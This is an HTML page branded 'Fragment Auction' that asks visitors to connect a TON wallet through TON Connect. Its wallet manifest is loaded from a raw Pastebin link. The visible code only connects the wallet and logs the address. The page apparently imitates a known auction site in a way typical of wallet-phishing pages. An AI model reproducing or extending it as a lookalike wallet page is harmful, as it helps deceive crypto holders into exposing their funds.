
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta name="format-detection" content="telephone=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="MobileOptimized" content="176">
    <meta name="HandheldFriendly" content="True">
    <title>Fragment Auction</title>

    <!-- Styles -->
    <link rel="stylesheet" href="/css/bootstrap.mineccb.css">
    <link rel="stylesheet" href="/css/bootstrap-extrac81e.css">
    <link rel="stylesheet" href="/css/auctiond09b.css">

    <!-- Scripts -->
    <script src="src/web/js/jquery.minc4ca.js"></script>
    <script src="src/web/js/bootstrap.min.js"></script>
    <script src="src/web/js/tonconnect-ui.min1679.js"></script>
</head>
<body>
    <header>
        <h1>Fragment Auction</h1>
    </header>

    <main>
        <section>
            <h2>Welcome to the auction!</h2>
            <p>Connect your wallet to participate.</p>
            <button id="ton-connect-button">Connect TON Wallet</button>
        </section>
    </main>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Initialize TON Connect UI
            const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: 'https://pastebin.com/raw/GwU4Duh6'
            });

            // Handle connect button click
            const connectButton = document.getElementById('ton-connect-button');
            connectButton.addEventListener('click', async () => {
                try {
                    if (!tonConnectUI.connected) {
                        await tonConnectUI.connectWallet();
                        console.log("Wallet connected:", tonConnectUI.wallet.account.address);
                    } else {
                        console.log("Wallet already connected:", tonConnectUI.wallet.account.address);
                    }
                } catch (error) {
                    console.error("Error connecting wallet:", error);
                }
            });

            // Update UI on status change
            tonConnectUI.onStatusChange(status => {
                console.log("Wallet connection status changed:", status);
            });
        });
    </script>
</body>
</html>
